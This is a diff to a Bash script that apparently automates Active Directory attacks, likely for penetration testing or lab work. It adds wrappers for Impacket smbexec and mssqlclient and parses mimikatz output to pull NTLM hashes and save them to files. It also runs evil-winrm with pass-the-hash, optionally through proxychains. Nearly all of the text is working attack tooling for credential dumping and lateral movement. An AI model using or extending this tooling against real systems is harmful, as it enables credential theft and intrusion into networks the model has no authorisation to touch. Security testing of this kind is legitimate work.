@@ -62,6 +62,8 @@ perform_impacket_kerberoast() {
     perform_impacket "impacket-GetUserSPNs" "-request $1"
 }
 
+
+
 perform_impacket() {
     local impacket_command="$1"
     if [[ -z "$impacket_command" ]]; then
@@ -347,8 +349,22 @@ perform_impacket_smbexec() {
         return 0
     fi
     output_hashes="false"
-    perform_impacket "impacket-smbexec"
+    perform_impacket "impacket-smbexec" "$1"
 }
+
+perform_impacket_mssqlclient() {
+    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
+        echo "Username, NTLM hash, and target IP address must be set before running Impacket SMBExec command."
+        return 1
+    fi
+    if pgrep -f "mssqlclient.py .*$target_ip"; then
+        echo "Impacket MSSQLClient is already running, please stop it first."
+        return 0
+    fi
+    output_hashes="false"
+    perform_impacket "impacket-mssqlclient" "$1"
+}
+
 
 perform_dcom() {
     if [[ -z "$target_ip" ]]; then
@@ -387,6 +403,21 @@ run_mimikatz_export_tickets() {
     echo '.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit;'
 }
 
+write_ntlm_hash_to_file() {
+    if [[ -z "$ntlm_hash" ]]; then
+        echo "NTLM hash is not set, cannot write to file." >> $trail_log
+        return 1
+    fi
+    if [[ ! -z "$target_username" ]]; then
+        hash_file="hashes.$target_username"
+    fi
+    if [[ -f "$hash_file" ]]; then
+        echo "$hash_file already exists, skipping writing NTLM hash." >> $trail_log
+        return 0
+    fi
+    echo "$ntlm_hash" > "$hash_file"
+}
+
 get_ntlm_hash_from_mimikatz_log_logonpasswords() {
     if [[ -z "$mimikatz_log" ]]; then
         mimikatz_log="mimikatz_logonpasswords.log"
@@ -404,7 +435,7 @@ get_ntlm_hash_from_mimikatz_log_logonpasswords() {
         return 1       
     fi
     sudo dos2unix "$mimikatz_log" >> /dev/null 2>&1
-    awk '
+    ntlm_hash=$(awk '
         /'"$target_username"'/ {
             if (getline > 0 && /'"$target_domain"'/) {            
                 if (getline > 0 && /NTLM/) {
@@ -412,7 +443,9 @@ get_ntlm_hash_from_mimikatz_log_logonpasswords() {
                 }
             }
         }
-    ' "$mimikatz_log"
+    ' "$mimikatz_log" | head -n 1)
+    write_ntlm_hash_to_file
+    echo "$ntlm_hash"
 }
 
 
@@ -440,6 +473,9 @@ get_ntlm_hash_from_mimikatz_log_lsadump() {
             }
         }
     ' "$mimikatz_log" )
+    write_ntlm_hash_to_file
+    echo "$ntlm_hash"
+
 }
 
 get_golden_ticket() {
@@ -523,7 +559,7 @@ run_evil_winrm() {
             echo "NTLM hash is not set. Please set it before running"
             return 1
         else
-            password_option="-H $ntlm_hash"
+            password_option="-H ${ntlm_hash^^}"
         fi  
     else
         password_option="-p $password"
@@ -532,7 +568,14 @@ run_evil_winrm() {
         echo "Evil-WinRM is already running for $target_ip"
         return 0
     fi
-    evil-winrm -i "$target_ip" "$username_option" "$password_option" | tee >(remove_color_to_log >> $trail_log)
+    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
+        proxychain_command="proxychains -q "
+        echo "Running evil-winrm with proxychains"
+    else
+        proxychain_command=""
+    fi
+    echo ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option"
+    eval ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option" | tee >(remove_color_to_log >> $trail_log)
 
 }   
 
